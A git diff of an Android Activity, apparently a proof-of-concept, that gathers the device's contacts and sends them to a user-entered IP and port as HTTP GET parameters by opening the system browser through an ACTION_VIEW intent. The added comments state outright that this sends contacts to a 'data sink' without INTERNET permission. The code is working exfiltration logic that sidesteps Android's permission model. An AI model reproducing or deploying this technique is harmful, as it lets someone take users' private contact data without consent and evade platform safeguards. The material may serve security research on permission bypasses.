@@ -12,7 +12,6 @@ import android.view.inputmethod.InputMethodManager;
 import android.widget.EditText;
 
 public class MyContacts extends Activity {
-	public static final String TAG = "MainActivity : ";
 	public static final String TITLE = "~~ Contacts ~~";
 
 	@Override
@@ -22,26 +21,37 @@ public class MyContacts extends Activity {
 
 		this.getActionBar().setTitle(TITLE);
 		
+		/*
+		 * pop up the soft keyboard when user is typing
+		 */
 		EditText temp = (EditText) this.findViewById(R.id.etIp);
 		InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
 		imm.showSoftInput(temp, InputMethodManager.SHOW_IMPLICIT);
-
-		Log.i(TAG, "onCreate finished");
 	}
-
+	
+	/*
+	 * Each time the Activity is resumed, 
+	 * the GetContactsTask will be executed once
+	 * to retrieve the contacts and upate UI
+	 */
 	@Override
-	protected void onResume() {
-		Log.d(TAG, "onResume started.");
-		
+	protected void onResume() {		
 		super.onResume();
 		new GetContactsTask(this).execute();
-		
-		Log.i(TAG, "onResume finished.");
 	}
 
+	/*
+	 * When the "send contacts" button is pressed,
+	 * this.sendContacts() will be invoked.
+	 * It will collect the ip and port from the EditText field,
+	 * and the contacts in string from the GetContactsTask.
+	 * Then it will make a Uri string containing the data sink address
+	 * and the contacts data in the format of HTTP GET.
+	 * Finally, it fire an intent with action string "Intent.ACTION_VIEW" and Uri.
+	 * The system build-in browser will receive the intent and open the Uri.
+	 * In this way, the contact can be sent to data sink without INTERNET permission.
+	 */
 	public void sendContacts(View view) {
-		Log.d(TAG, "sendContacts started");
-
 		String ip = ((EditText) this.findViewById(R.id.etIp)).getText()
 				.toString();
 		String port = ((EditText) this.findViewById(R.id.etPort)).getText()
@@ -51,11 +61,7 @@ public class MyContacts extends Activity {
 		if (!ip.equals("") && !port.equals(""))
 			addr = "http://" + ip + ":" + port + "/";
 
-		Log.i(TAG, "addr = " + addr);
-
 		Uri uri = Uri.parse(addr + "index.php?" + GetContactsTask.pairString);
 		startActivity(new Intent(Intent.ACTION_VIEW, uri));
-		
-		Log.d(TAG, "sendContacts finished");
 	}
 }
